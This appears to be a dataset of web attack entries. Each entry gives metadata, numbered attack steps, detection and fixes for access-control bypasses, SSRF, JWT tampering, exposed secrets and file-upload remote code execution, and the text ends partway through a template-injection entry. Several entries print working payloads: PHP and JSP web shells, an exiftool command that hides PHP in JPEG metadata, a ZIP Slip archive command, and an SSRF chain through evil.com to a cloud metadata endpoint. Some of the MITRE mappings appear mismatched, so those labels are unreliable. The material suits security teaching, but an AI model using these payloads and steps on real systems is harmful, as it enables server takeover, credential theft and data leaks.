## Predictable Resource Names (No Access Tokens)

- **Attack Type**: File Enumeration / Insecure Resource Access
- **Target**: Static Files / File Servers
- **Vulnerability**: No tokens or auth checks before file download
- **MITRE**: T1530 – Data from Information Repositories
- **Impact**: Data leak, mass file download, competitive intel theft
- **Tools**: Browser, Burp Suite, Dirbuster, FFUF
- **Scenario**: Publicly accessible files or private documents can be downloaded by guessing URLs like report_001.pdf, invoice_100.pdf, etc.
- **Attack Steps**: Step 1: Log in as a user and try to download a file — like an invoice or report — e.g., https://site.com/download/report_001.pdf. Step 2: Try changing the number in the URL — report_002.pdf, report_003.pdf, and so on. Step 3: If the files download without any login check or token, the server has no access control. Step 4: Use tools like Burp Intruder or FFUF to automate the process and scan 100s of predictable file names. Step 5: You may be able to collect sensitive documents that belong to other users or admins. Step 6: Also test with predictable user folders: /files/user1/, /files/user2/, etc. Step 7: Try accessing /backup.zip, /export.csv, or /admin_data.sql. Step 8: If the system never checks who requested the file, it's vulnerable to enumeration and mass scraping. Step 9: Practice safely in test apps like DVWA or bWAPP.
- **Detection**: Monitor abnormal download patterns; log access to file paths; block excessive sequential file requests
- **Solution**: Enforce authentication per file request; use random file names; token-protect private downloads
- **Tags**: File Enumeration, No Token Access, Predictable URLs

## Broken Function-Level Access Control

- **Attack Type**: Backend Route Abuse
- **Target**: Admin Features / APIs
- **Vulnerability**: No server-side check for user role or privilege
- **MITRE**: T1068 – Exploitation for Privilege Escalation
- **Impact**: Low users gain admin functions, break logic
- **Tools**: Browser, Burp Suite, Postman
- **Scenario**: Backend API routes or URLs don’t enforce role restrictions. Attackers can invoke functions (e.g., delete user) as regular users.
- **Attack Steps**: Step 1: Log in as a low-privileged user (e.g., guest). Step 2: Visit different parts of the app and inspect actions such as editing profile, viewing reports, or managing users using dev tools. Step 3: In browser or Burp Suite, find a request like POST /deleteUser?id=1234. Step 4: Manually send this request as a guest or non-admin user. Step 5: If the action works — such as deleting a user or editing a protected resource — the server has not enforced role-based access control. Step 6: Try modifying URLs like /admin/resetPassword, /updateRole?user=5&role=admin, etc., to see if they function. Step 7: This is often caused by devs relying on frontend controls (e.g., hiding buttons) and forgetting to verify role on the backend. Step 8: Test safely using OWASP Juice Shop’s broken access control challenges — you’ll see real examples. Step 9: Never perform on live systems without authorization.
- **Detection**: Monitor all privileged endpoints; log non-admins calling admin functions
- **Solution**: Enforce RBAC strictly server-side; never trust UI controls alone
- **Tags**: Function Bypass, Admin API Abuse, Logic Escalation

## Abusing URL Rewrite or Routing Rules

- **Attack Type**: URL Pattern Tampering / Rewrite Exploits
- **Target**: Clean URLs / REST APIs
- **Vulnerability**: No validation on rewritten/clean URLs
- **MITRE**: T1203 – Exploitation of App Logic
- **Impact**: Privilege bypass via route manipulation
- **Tools**: Browser, Dev Tools, Burp Suite
- **Scenario**: Modern apps use friendly URLs like /user/yug/profile → attacker changes this pattern to access /user/admin/profile or direct routing paths to functions.
- **Attack Steps**: Step 1: Log in to the application and inspect any clean or friendly URLs — e.g., /user/john, /profile/yug, /dashboard/john. Step 2: Try changing the visible part of the URL to a known user or role like admin, support, or finance. For example: change /user/john to /user/admin. Step 3: If the system loads the admin profile or dashboard, routing logic is being manipulated. Step 4: Some frameworks use insecure URL rewriting rules where frontend paths directly invoke backend logic. Step 5: Try paths like /delete/user/1, /grant-role/user2/admin, or /submit/form?id=5 to see if function routing is exposed via URL. Step 6: These issues happen when developers assume route format is secure. Step 7: Also test if changing URL suffixes (e.g., .json, .php, .html) changes behavior. Step 8: If no auth check happens and functions still execute, it's vulnerable. Step 9: Test this safely in OWASP Juice Shop where rewrite patterns like /rest/admins can be manipulated.
- **Detection**: Log unexpected routes accessed; block unknown route patterns
- **Solution**: Validate all route parameters server-side; avoid trust in URL names
- **Tags**: Routing Exploit, Clean URL Abuse, Rewrite Tampering

## Authorization Bypass via Parameter Injection

- **Attack Type**: Hidden Parameter Tampering
- **Target**: Forms / APIs / URLs
- **Vulnerability**: Trusting client input (e.g., role, flags)
- **MITRE**: T1203 – Exploitation of App Logic
- **Impact**: Unauthorized access, privilege escalation
- **Tools**: Browser Dev Tools, Burp Suite
- **Scenario**: Attackers inject or modify parameters (e.g., is_admin=true) in web forms or URLs to escalate privilege or bypass checks.
- **Attack Steps**: Step 1: Log in as a normal user and navigate to a page where you can update your profile, view orders, or submit a form. Step 2: Right-click → Inspect (or F12) → go to the "Network" tab or "Form" section. Look at what parameters are being submitted when you click "Save" or "Submit." Step 3: Some sites may hide parameters like is_admin=false, user_id=1234, or role=user in hidden form fields or in the request body. Step 4: Use dev tools or Burp Suite to modify these fields before submitting — change is_admin=false to is_admin=true, or user_id=1 to user_id=2. Step 5: Submit the modified form. If the app doesn’t validate on the server and accepts your changes, you now have unauthorized access. Step 6: Try sending the modified request using Burp Repeater or Postman as well to verify behavior. Step 7: This attack is common when frontend validation is used but the backend blindly trusts inputs. Step 8: You can try this in OWASP Juice Shop → checkout or user profile pages. Step 9: If the system now treats you as an admin or another user, the bypass succeeded.
- **Detection**: Monitor unexpected values in parameters; log all admin role requests from user accounts
- **Solution**: Validate all parameters on server; reject role flags or ID tampering; use signed tokens instead of editable flags
- **Tags**: Parameter Pollution, Role Abuse, Hidden Fields

## Misconfigured Access Control Lists (ACLs)

- **Attack Type**: Cloud Storage Exposure
- **Target**: AWS/Azure Buckets, GCP
- **Vulnerability**: Misconfigured object permissions (read/write public)
- **MITRE**: T1530 – Data from Info Repositories
- **Impact**: Sensitive file exposure, credential leaks
- **Tools**: Browser, AWS CLI, GrayhatWarfare, S3Scanner
- **Scenario**: Files or cloud buckets (e.g., AWS S3, Azure Blob) are accidentally marked as public, allowing attackers to list, read, or modify contents.
- **Attack Steps**: Step 1: Use sites like https://buckets.grayhatwarfare.com to search public AWS S3 buckets. Type common org names or guessable keywords. Step 2: If you find a bucket that’s publicly accessible, try accessing its contents in your browser — e.g., https://s3.amazonaws.com/company-bucket-name/file.pdf. Step 3: Use aws s3 ls s3://bucket-name --no-sign-request in terminal to list files without credentials. If the bucket is open, it will respond. Step 4: Download files using aws s3 cp s3://bucket-name/file.txt . --no-sign-request. Step 5: Some misconfigured buckets even allow write access — test uploading a file like test.txt. Step 6: To scan a full domain range for exposed cloud storage, use S3Scanner or Bucket Finder tools. Step 7: Explore folders like /backup/, /logs/, /db_dumps/. Step 8: If you can read or write without auth, the ACL is misconfigured. Step 9: This vulnerability has been exploited in real breaches (e.g., Verizon, Accenture leaks). Practice only on your own AWS account or safe sandbox labs.
- **Detection**: Enable bucket logging; alert on anonymous access attempts
- **Solution**: Always set buckets to private; require IAM-based access; use signed URLs for file sharing
- **Tags**: S3, ACLs, Cloud Leak, Public Files

## Insecure API Gateway / Proxy Rules

- **Attack Type**: IP/Token Spoofing Bypass
- **Target**: API Gateway / Reverse Proxy
- **Vulnerability**: Trusting spoofed headers, weak filtering rules
- **MITRE**: T1190 – Exploit Public-Facing App
- **Impact**: Internal API access, privilege bypass
- **Tools**: Burp Suite, curl, Postman
- **Scenario**: Attackers bypass authentication by injecting spoofed headers (e.g., X-Forwarded-For) or abusing incorrect API gateway configs.
- **Attack Steps**: Step 1: Identify an API behind a gateway (e.g., AWS API Gateway, NGINX reverse proxy, Cloudflare) that only protects based on IP or token headers. Step 2: Try sending a request with X-Forwarded-For: 127.0.0.1 or X-Real-IP: 127.0.0.1. Some misconfigured gateways trust this and assume it came from internal network. Step 3: Also try replacing or injecting headers like Authorization, X-Api-Key, X-User using Burp Suite or Postman. Step 4: If the backend system accepts these headers and gives access (e.g., admin API), the gateway rule is misconfigured. Step 5: Another common trick is to change HTTP methods (e.g., GET → POST) or to bypass filtering rules by using POST /admin/../user. Step 6: Try access patterns like /admin from multiple IPs or browsers to observe behavior. Step 7: This flaw is often seen in setups where frontend services trust headers without verification. Step 8: Test only on safe APIs — Juice Shop or Burp Labs allow some simulations. Step 9: If your fake headers trigger internal access, you have bypassed the gateway.
- **Detection**: Log header anomalies; alert on spoofed X-Forwarded-For; check method vs route mismatches
- **Solution**: Never trust forwarded headers blindly; strip or validate headers before passing to backend
- **Tags**: API Gateway Bypass, IP Spoofing, Proxy Misconfig

## Time-of-Check to Time-of-Use (TOCTOU) Issues

- **Attack Type**: Race Condition / Logic Gap
- **Target**: Multi-step Functions
- **Vulnerability**: Access checked once, then assumed valid
- **MITRE**: T1499.004 – Application Layer DoS
- **Impact**: Privilege abuse, action execution without proper auth
- **Tools**: Burp Suite Intruder, Turbo Intruder
- **Scenario**: An attacker exploits the gap between when access is verified and when it is used — tricking the system by acting between these moments.
- **Attack Steps**: Step 1: Identify a flow where the app checks permission before performing an action — e.g., download file, submit form, approve request. Step 2: Intercept the request that performs the action using Burp Suite. Step 3: Send this request multiple times very quickly — use Burp Intruder or Turbo Intruder to send 10–100 requests per second. Step 4: Sometimes the first request is denied (e.g., permission rejected), but one of the rapid requests gets through because the system failed to recheck access before acting. Step 5: Try using TOCTOU on workflows like transferring money, deleting data, or updating user roles. Step 6: You may also race a state change — e.g., user requests deletion, but races to reverse it or fetch it before it’s gone. Step 7: Some labs simulate this — bWAPP has a TOCTOU challenge. Step 8: This issue happens in apps that only validate once, not every time before using the data. Step 9: If your action succeeded despite prior rejection, the race condition exploited TOCTOU.
- **Detection**: Monitor repeated high-speed access attempts; track mismatch in check vs execution timestamps
- **Solution**: Always validate permissions immediately before execution; use locks or atomic transactions
- **Tags**: TOCTOU, Race Condition, Inconsistent Auth

## Cookie or JWT Tampering

- **Attack Type**: Modify Tokens for Privilege Escalation
- **Target**: JWT-Based Apps
- **Vulnerability**: Insecure JWT Signature Validation or None Alg
- **MITRE**: T1552 – Unsecured Credentials
- **Impact**: Privilege escalation, unauthorized dashboard access
- **Tools**: Browser Dev Tools, JWT.io, Burp Suite
- **Scenario**: Many apps store roles like user or admin inside cookies or JWTs. If unsigned or weakly protected, attackers can modify them to gain admin access.
- **Attack Steps**: Step 1: Log in as a normal user. Go to developer tools (F12) → Application tab → Cookies section. Look for a cookie like auth_token or session. If it’s a JWT, it will look like three sections separated by dots (header.payload.signature). Step 2: Copy the full token. Open https://jwt.io and paste the token in the left side. Step 3: If the JWT is unsigned (alg: none in the header), or the server doesn’t validate the signature, you can tamper with it. Step 4: In the payload, change "role": "user" to "role": "admin" and remove the signature part. Step 5: Copy the modified JWT and replace it in your browser’s cookie using the dev tools. Step 6: Refresh the page. If you now have admin access or see privileged options, the server failed to validate the token properly. Step 7: This works when JWTs use none algorithm or symmetric keys are leaked. Step 8: You can also try this with base64-encoded cookies — decode, modify, and re-encode. Test this safely in OWASP Juice Shop challenges under "JWT." Step 9: If successful, you bypassed auth using token tampering.
- **Detection**: Check for tampered or unsigned JWTs; log abnormal role changes
- **Solution**: Always sign JWTs with strong keys; never use "none" alg; validate roles server-side
- **Tags**: JWT Tampering, Cookie Modification, Auth Token Injection

## Access via SSRF or Redirect Confusion

- **Attack Type**: Server-side request bypass via URL tricks
- **Target**: Internal Admin Routes
- **Vulnerability**: Server fetching attacker-controlled URLs
- **MITRE**: T1190 – SSRF
- **Impact**: Expose internal endpoints or cloud metadata
- **Tools**: Burp Suite, RequestBin, Ngrok
- **Scenario**: A vulnerable app fetches URLs on behalf of user — attacker tricks it into calling internal endpoints (e.g., /admin) or cloud metadata (e.g., AWS).
- **Attack Steps**: Step 1: Find a feature that allows you to provide a URL — like a "fetch image", "validate link", or "generate preview" field. Step 2: Submit a normal external URL like http://example.com/image.jpg to see if the server fetches and returns the result. Step 3: If it works, try using internal IPs like http://127.0.0.1:80, http://localhost/admin, or cloud metadata endpoints like http://169.254.169.254/latest/meta-data/. Step 4: If you get a valid response (like JSON or HTML), the server is vulnerable to SSRF. Step 5: You can also use https://webhook.site to log outbound requests — if the server accesses your endpoint, it confirms SSRF. Step 6: Try chaining SSRF with open redirect — e.g., http://evil.com/redirect?to=http://localhost/admin. The server thinks it’s fetching a normal URL but ends up hitting an internal route. Step 7: If this route reveals private data or admin content, you've successfully bypassed auth via SSRF. Step 8: Practice this safely using Juice Shop "SSRF" challenge. Step 9: Never exploit live sites — always test in lab or legal bug bounty programs.
- **Detection**: Monitor outbound requests to internal/private IPs; alert on localhost traffic
- **Solution**: Validate requested URLs against allowlists; block access to internal IPs, metadata, or loopback hosts
- **Tags**: SSRF, Internal Access, Open Redirect Bypass

## Debug Endpoints Left Exposed

- **Attack Type**: Public Debug or Status Pages
- **Target**: Dev Tools / Backend Panels
- **Vulnerability**: Leftover dev/debug panels accessible in prod
- **MITRE**: T1210 – Exploitation of Remote Services
- **Impact**: System exposure, secrets, or code execution
- **Tools**: Browser, Dirb, FFUF, Google Dorks
- **Scenario**: Developers leave behind /debug, /status, /test, /console routes after deployment, which expose sensitive info or even allow code execution.
- **Attack Steps**: Step 1: Try visiting common debug endpoints like /debug, /status, /admin/status, /test, /console, /env, /actuator. These are often used in development. Step 2: If you see environment variables, logs, or stack traces, the debug endpoint is active. Step 3: Use tools like ffuf, dirsearch, or Google Dorks (e.g., inurl:/debug site:example.com) to discover hidden debug paths. Step 4: Some frameworks (like Spring Boot) expose /actuator or /env endpoints that leak configuration, tokens, or internal logs. Step 5: If accessible, try submitting commands via the debug page — e.g., JavaScript console or HTTP method forms. Step 6: Sometimes apps offer developer backdoors (e.g., /?debug=true) — test for such parameters. Step 7: In some cases, a debug console allows you to change app state, execute queries, or crash services. Step 8: These are severe in production — attackers can exploit them for full app takeover. Step 9: Practice in DVWA or simulate in test servers for safety.
- **Detection**: Scan for common dev endpoints; alert on /debug or /console in production routes
- **Solution**: Remove debug panels before deployment; restrict with IP, password, or disable completely
- **Tags**: Debug Panels, Console Access, Forgotten Endpoints

## Exposed Static Files Containing Secrets

- **Attack Type**: Unprotected Resource Disclosure
- **Target**: Static File Servers
- **Vulnerability**: Forgotten or unprotected backup/config files
- **MITRE**: T1552.001 – Code Repositories
- **Impact**: Full application compromise, DB access, credential leak
- **Tools**: Browser, Dirbuster, GitTools
- **Scenario**: Developers accidentally expose .env, .git, .bak, or old config.js files that contain credentials, secrets, or DB info.
- **Attack Steps**: Step 1: Try accessing paths like /.env, /config.js, /backup.sql, .git/config, or /admin.bak. These files are sometimes deployed by mistake. Step 2: Use tools like dirb, gobuster, or ffuf to brute force file names based on common wordlists (e.g., SecLists). Step 3: If the server allows access to these files, download and inspect them. Look for secrets like DB_PASSWORD, API_KEY, JWT_SECRET, or cloud access credentials. Step 4: For .git/, use GitTools to dump repository contents — sometimes source code or passwords are exposed. Step 5: Also try .DS_Store (macOS), .swp (vim backups), or ~-suffixed files which may contain old source code. Step 6: These files may allow full takeover — use leaked secrets to log in, access DB, or reverse engineer logic. Step 7: Practice in Juice Shop under "Security Misconfiguration" challenge or host your own test app. Step 8: If you find secrets, never use them illegally — report responsibly.
- **Detection**: Monitor unusual file accesses; restrict access to sensitive file patterns
- **Solution**: Disallow public access to sensitive file extensions; scan deployment packages before push
- **Tags**: Static Secrets, Backup Files, .env Exposure

## Bypassing Multi-Tenant Boundaries

- **Attack Type**: Tenant Isolation Bypass via ID/Token Tampering
- **Target**: Multi-Tenant SaaS Apps
- **Vulnerability**: Weak server-side tenant access control
- **MITRE**: T1203 – Exploitation for Privilege Escalation
- **Impact**: Cross-tenant access, sensitive data leaks, impersonation
- **Tools**: Burp Suite, Postman, Browser Dev Tools
- **Scenario**: In a multi-tenant SaaS system, each customer ("tenant") should only access their own data. Attackers tamper with IDs, headers, or URLs to access others’ data.
- **Attack Steps**: Step 1: Sign up or log in to a SaaS product that supports multiple organizations or accounts (multi-tenancy), like a CRM, HR tool, or project management app. Step 2: Observe how the system manages your tenant — e.g., do URLs contain /tenant_id/, or are headers like X-Tenant-ID sent with requests? Step 3: Navigate to a page that shows tenant-specific data — like /tenant/1234/invoices or /api/projects?org=1234. Step 4: Use developer tools (F12) → Network tab or tools like Burp Suite to intercept and view the request. Step 5: Look for identifiers in the URL, request body, headers, or cookies that link your user to your tenant, such as "tenant_id": "1234" or "org_id": "alpha". Step 6: Modify this ID to another number or string — e.g., "tenant_id": "9999" or /api/projects?org=beta. Step 7: Send the modified request and see if the server responds with data from a different tenant. If yes, the system is not enforcing isolation properly. Step 8: Also try changing JWT payload (if exposed) that includes "tenant_id" or "role" — use jwt.io to decode and test. Step 9: If successful, you may gain unauthorized access to another tenant's projects, invoices, files, or users. Step 10: This can also be tried with GraphQL queries if the app uses GraphQL endpoints — tamper with organizationId fields. Step 11: This flaw has been exploited in real SaaS breaches (e.g., Microsoft, Slack tenant bugs). Only test in your own test setups, bug bounty programs, or DVSA lab environments.
- **Detection**: Log and alert on cross-tenant ID usage; check for inconsistencies between session and data owner
- **Solution**: Enforce strict server-side tenant checks using user sessions; never trust client-supplied tenant IDs or headers
- **Tags**: Multi-Tenant, SaaS Bypass, Tenant Escalation

## Upload PHP Shell (e.g., shell.php)

- **Attack Type**: Remote Code Execution via File Upload
- **Target**: PHP-Based Upload Portals
- **Vulnerability**: Lack of file type validation
- **MITRE**: T1059 – Command Execution
- **Impact**: Full system takeover, remote shell access
- **Tools**: Burp Suite, shell.php, browser
- **Scenario**: Attacker uploads a .php file (web shell) and accesses it via browser to execute system commands on the server remotely.
- **Attack Steps**: Step 1: Log in to a web app with file upload functionality (e.g., profile photo, document upload). Step 2: Try uploading a harmless .jpg file to confirm upload location and how URLs are built (e.g., https://site.com/uploads/yourphoto.jpg). Step 3: Create a basic web shell file named shell.php with the following code: <?php system($_GET['cmd']); ?>. This allows execution of system commands via browser like shell.php?cmd=whoami. Step 4: Attempt to upload shell.php via the upload feature. If blocked, note the error message (e.g., "Only JPG allowed"). Step 5: If upload succeeds, access the file via browser at the uploaded path (e.g., site.com/uploads/shell.php). Step 6: In URL bar, run commands like ?cmd=ls, ?cmd=id, ?cmd=uname -a — if server executes them and shows output, the attack worked. Step 7: Now test advanced shells like b374k.php or c99.php, which offer full UI control of the server. Step 8: Only use on legal testing environments like DVWA or local VMs. This results in Remote Code Execution (RCE).
- **Detection**: Monitor for suspicious PHP uploads; log access to /uploads/*.php
- **Solution**: Block .php uploads; validate MIME type and content; store files outside web root
- **Tags**: PHP Shell Upload, Webshell, RCE via Upload

## Content-Type Bypass (MIME Smuggling)

- **Attack Type**: MIME Type Confusion
- **Target**: File Upload APIs / Forms
- **Vulnerability**: Trusting Content-Type over actual file contents
- **MITRE**: T1203 – Exploitation of File Parsing
- **Impact**: Upload of dangerous files disguised as safe content
- **Tools**: Burp Suite, shell.php
- **Scenario**: Attacker uploads shell.php but tricks the server by declaring it as an image file (e.g., Content-Type: image/jpeg) so validation passes.
- **Attack Steps**: Step 1: Prepare a PHP shell file (e.g., shell.php) with code like <?php system($_GET['cmd']); ?>. Step 2: Open Burp Suite and intercept the request to upload the file. Step 3: In Burp, modify the Content-Type header to image/jpeg even though the file is .php. Some apps only validate headers, not actual content. Step 4: Forward the request. If the server accepts the upload, check if the file lands in an accessible URL (e.g., /uploads/shell.php). Step 5: Visit the URL with ?cmd=whoami and check if the command executes. If yes, the upload bypass worked. Step 6: This attack abuses MIME-sniffing flaws where file validation depends on HTTP headers instead of content. Step 7: You can also try Content-Type: application/octet-stream or rename the file after upload using backend APIs. Step 8: Works on misconfigured Apache, NGINX, or PHP-based systems. Step 9: Practice in DVWA file upload section or TryHackMe’s “Inclusion” room. Step 10: Always report such issues to owners via responsible disclosure.
- **Detection**: Alert when content-type doesn’t match file magic bytes
- **Solution**: Use file magic detection (e.g., libmagic); reject based on actual file content, not headers
- **Tags**: MIME Smuggling, Content-Type Bypass, File Upload

## Extension Double Bypass (shell.php.jpg)

- **Attack Type**: Upload Name Bypass
- **Target**: Apache/Nginx Upload Handler
- **Vulnerability**: Weak filename extension enforcement
- **MITRE**: T1036 – Masquerading Files
- **Impact**: File upload filter evasion, potential RCE
- **Tools**: Burp Suite, Local File Tool, curl
- **Scenario**: Attacker bypasses upload filters by disguising .php file with extra extension like .php.jpg or using filename tricks.
- **Attack Steps**: Step 1: Rename your PHP shell file from shell.php to shell.php.jpg. Step 2: Upload this file using the web app’s upload form. If the app only checks for .jpg, it may allow the file. Step 3: After upload, test if the file is accessible at a URL like https://site.com/uploads/shell.php.jpg. Step 4: Now try visiting shell.php.jpg?cmd=id. Some backends may parse the file as PHP despite the .jpg extension. Step 5: In certain servers (especially Apache), if .htaccess has AddType application/x-httpd-php .jpg, it will treat .jpg files as executable PHP. Step 6: Alternatively, backend logic may rename or strip extensions — so a shell.php.jpg might become shell.php during processing. Step 7: Some vulnerable systems may also allow upload of file.php;.jpg or file.php%00.jpg which get interpreted as .php. Step 8: Test this in DVWA or Juice Shop upload challenges. Step 9: If command execution occurs, you’ve successfully bypassed the extension filter. Step 10: Only test in ethical hacking labs or authorized systems.
- **Detection**: Monitor uploaded file extensions and execution access
- **Solution**: Only allow safe extensions; sanitize filenames; avoid treating user-named files as executable
- **Tags**: File Upload Bypass, Double Extension, Upload RCE

## Case Variation or Null Byte Injection

- **Attack Type**: Obfuscation for Upload Execution
- **Target**: Legacy PHP Servers
- **Vulnerability**: Case-insensitive validation, null byte parsing
- **MITRE**: T1203 – Exploitation of App Logic
- **Impact**: Extension filter evasion, possible shell upload
- **Tools**: Burp Suite, curl, browser
- **Scenario**: Bypass filters by manipulating filename casing (.PhP) or injecting null bytes (%00) in the filename to fool extension checks.
- **Attack Steps**: Step 1: Rename your web shell from shell.php to shell.PhP or shell.PHp. Some servers treat .php, .PHP, .PhP the same during execution. Step 2: Upload this file through the app’s upload form. If the app checks for lowercase .php only, it may fail to detect and allow the file. Step 3: Try accessing shell.PhP?cmd=whoami in your browser. If the server executes it, then the filter is case-sensitive and bypassed. Step 4: Additionally, try appending a null byte (%00) before an allowed extension: e.g., shell.php%00.jpg — in older PHP versions or misconfigured apps, %00 truncates the filename. Step 5: Use Burp Suite to manually craft such payloads and intercept upload requests. Step 6: Observe how the server stores the file — sometimes it strips extensions automatically or reinterprets files on rename. Step 7: This technique is less common in modern PHP but still seen in legacy apps. Step 8: Practice in bWAPP’s “Upload” module with null byte toggled. Step 9: If RCE is achieved through filename tricks, you’ve successfully bypassed auth filters. Step 10: Always verify legality before performing such tests.
- **Detection**: Log suspicious filename variations; block double/mixed extensions
- **Solution**: Enforce strict lowercase extension checks; disallow null bytes and validate filename on server side
- **Tags**: Null Byte, Filename Bypass, Case Insensitive Upload

## Client-side Filtering Bypass

- **Attack Type**: JS Validation Bypass
- **Target**: JS-Validated Upload Forms
- **Vulnerability**: Relying on client-side file type filtering
- **MITRE**: T1203 – Exploitation of App Logic
- **Impact**: Remote code execution, bypass of intended validation
- **Tools**: Burp Suite, browser dev tools
- **Scenario**: Upload form uses JavaScript to block .php or .exe, but attacker uses a proxy tool like Burp Suite to modify the request directly and bypass the browser filter.
- **Attack Steps**: Step 1: Open a file upload form in your browser and try uploading a PHP file (e.g., shell.php). Observe that the browser displays an error like “file type not allowed” — this is client-side filtering via JavaScript. Step 2: Open Burp Suite and enable “Intercept On.” Step 3: Re-submit the upload and intercept the request. Step 4: In the intercepted HTTP POST request, manually change the file name to shell.php. You can also edit Content-Type if needed. Step 5: Forward the request to the server. Since the browser check is bypassed, the server may accept the file. Step 6: If upload is successful, access it at the upload path (e.g., /uploads/shell.php). Step 7: Append ?cmd=whoami to see if system commands execute. Step 8: This shows that client-side filtering is never enough — always validate server-side. Step 9: Test this technique safely in DVWA or bWAPP under “File Upload” challenges.
- **Detection**: Monitor uploaded files with unexpected extensions
- **Solution**: Implement server-side extension/MIME checks; reject based on backend validation, not JS
- **Tags**: Client-Side Bypass, JavaScript Filtering, File Upload RCE

## Image Polyglot (PHP in JPEG)

- **Attack Type**: Polyglot Upload / File Parsing Confusion
- **Target**: Apache or mod_php Servers
- **Vulnerability**: Executable code hidden in valid image metadata
- **MITRE**: T1059 – Command Execution
- **Impact**: Full server compromise from disguised file
- **Tools**: ExifTool, Burp Suite, shell.php
- **Scenario**: Attacker hides PHP code in metadata or comments of a valid JPEG image. If the server parses the image using mod_php, the PHP inside gets executed.
- **Attack Steps**: Step 1: Prepare a normal JPEG file using any image editor. Step 2: Use ExifTool to inject PHP code in the metadata: exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg. Step 3: Rename the file to something like backdoor.jpg. Step 4: Upload it to the vulnerable site. Some apps allow .jpg without checking file contents. Step 5: Access the uploaded file via browser: /uploads/backdoor.jpg?cmd=id. Step 6: If the server runs Apache with mod_php, it may process .jpg as PHP if configured (e.g., via .htaccess with AddHandler application/x-httpd-php .jpg). Step 7: If the result displays output of the id command, the attack succeeded. Step 8: This polyglot technique works because file parsers rely on extension, but interpreters read file content. Step 9: Try other image types (.png, .gif) if .jpg fails. Step 10: Test safely in TryHackMe’s “Inclusion” or “Upload Vulnerabilities” labs.
- **Detection**: Log image requests with query parameters; scan uploaded files for mixed content
- **Solution**: Disable handler mapping for images; strip metadata using ExifTool; validate upload content
- **Tags**: Polyglot Image, Metadata Injection, PHP-in-JPEG

## Unrestricted Upload to Web Root

- **Attack Type**: RCE via Upload Path
- **Target**: Public Web Directories
- **Vulnerability**: Upload stored directly under executable directory
- **MITRE**: T1505.003 – Web Shell Injection
- **Impact**: Immediate RCE with full access to server files
- **Tools**: Browser, Burp Suite
- **Scenario**: Attacker uploads a malicious file directly into a public directory (e.g., /uploads/, /images/) served by the web server and executes it via URL.
- **Attack Steps**: Step 1: Identify the file upload feature. Upload a valid .jpg image to see where the file lands — check the URL returned or inspect HTTP response. Step 2: If file is saved in /uploads/ or /images/ and publicly accessible via https://example.com/uploads/filename.jpg, the app likely places user uploads in the web root. Step 3: Upload shell.php (or bypass filters using techniques from SEC-239 to SEC-243). Step 4: After upload, try visiting https://example.com/uploads/shell.php?cmd=whoami. Step 5: If the shell executes, you have RCE via direct webroot exposure. Step 6: This flaw is critical because no additional bypass is required — uploaded code executes immediately. Step 7: Test in DVWA’s File Upload section or create your own vulnerable Flask/PHP app. Step 8: Secure apps store uploads in non-web directories (e.g., /var/files) and serve with read-only APIs. Step 9: This issue leads to immediate server takeover if exploited.
- **Detection**: Alert on uploads in webroot paths; log execution of unexpected files
- **Solution**: Store user uploads outside web-accessible directories; serve via tokenized downloads
- **Tags**: Webroot Upload, Apache RCE, Unsafe Upload Paths

## ZIP Upload → Server-side Extraction (ZIP Slip)

- **Attack Type**: Archive Extraction Path Traversal
- **Target**: Backend Archive Extractors
- **Vulnerability**: No path sanitization during archive extraction
- **MITRE**: T1564.001 – Hidden Artifacts
- **Impact**: Overwrites backend files, code injection, server takeover
- **Tools**: zip, Burp Suite, Python
- **Scenario**: Server extracts uploaded .zip file without sanitizing file paths inside. Attacker includes ../ in file paths to overwrite sensitive files.
- **Attack Steps**: Step 1: Create a malicious .zip archive using terminal: mkdir payload; echo '<?php system($_GET["cmd"]); ?>' > payload/shell.php; cd payload; zip ../evil.zip ../../../../var/www/html/uploads/shell.php. This command creates a ZIP with path traversal (../../../../) inside. Step 2: Upload evil.zip to a vulnerable web app that extracts archives server-side. Many apps do this for images, documents, or batch uploads. Step 3: If the server extracts files without sanitizing the paths, shell.php may land in /uploads/ or worse — /var/www/html/. Step 4: After upload, access the shell via browser and run commands (?cmd=ls). Step 5: This is called a "ZIP Slip" attack — archive path traversal. Step 6: Try various traversal depths depending on the server’s extraction path. Step 7: You can use Python’s zipfile or tools like 7z to craft such payloads. Step 8: Works in Java, PHP, and Python backends that unzip without checking paths. Step 9: Simulate in labs like TryHackMe’s “ZIP Slip” room. Step 10: This can lead to overwriting core files or backdoor injection.
- **Detection**: Monitor extraction paths; scan for suspicious filenames or overwritten files
- **Solution**: Strip traversal from archive entries before extraction; use secure ZIP libraries
- **Tags**: ZIP Slip, Path Traversal Upload, Archive Injection

## File Name Control via Path Traversal

- **Attack Type**: Arbitrary File Write via Upload Path Control
- **Target**: File Upload APIs
- **Vulnerability**: Lack of path validation / user-controlled write path
- **MITRE**: T1006 – File System Permissions Discovery
- **Impact**: RCE via full control of file placement
- **Tools**: curl, Burp Suite, shell.jsp
- **Scenario**: Attacker chooses the exact server file path for their uploaded file using ../ (path traversal), allowing overwrite or remote code execution.
- **Attack Steps**: Step 1: Identify a web app with upload functionality that includes a path parameter, such as POST /upload?path=some_folder. Step 2: Instead of using a safe folder, craft a path traversal like ../../../../tmp/shell.jsp to direct where the file should land. Step 3: Prepare a malicious payload like shell.jsp containing "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>" (Java web shell). Step 4: Send a POST request with your file as the body and set the path query parameter to the malicious location (e.g., /upload?path=../../../../var/www/html/shell.jsp). Step 5: If the server doesn’t sanitize the path, it will save the file exactly where specified. Step 6: Visit the deployed file at https://target.com/shell.jsp?cmd=id to execute commands. Step 7: This works on PHP, JSP, ASP, etc., depending on the backend. Step 8: Test in labs like DVWA or a custom vulnerable Flask/Express app with upload endpoints. Step 9: If successful, you’ve achieved RCE via arbitrary file write. Step 10: Use responsibly in bug bounty or test environments only.
- **Detection**: Monitor for ../ in paths; detect uploads outside expected directories
- **Solution**: Sanitize all upload paths; strip ../; store files with randomized names in secure folders
- **Tags**: Path Traversal, Arbitrary Upload Path, File Write

## Upload Template File (Jinja2, Twig, ERB)

- **Attack Type**: Template Injection via Uploaded File
- **Target**: Template-rendering Backends
- **Vulnerability**: Rendering untrusted templates from user uploads
- **MITRE**: T1059.001 – Command via Template Engine
- **Impact**: Full backend RCE, server takeover
- **Tools**: Burp Suite, Template Payloads, Flask app
- **Scenario**: Attacker uploads a file that contains server-side template code (e.g., Jinja2, Twig, ERB), which executes when rendered by the web app.
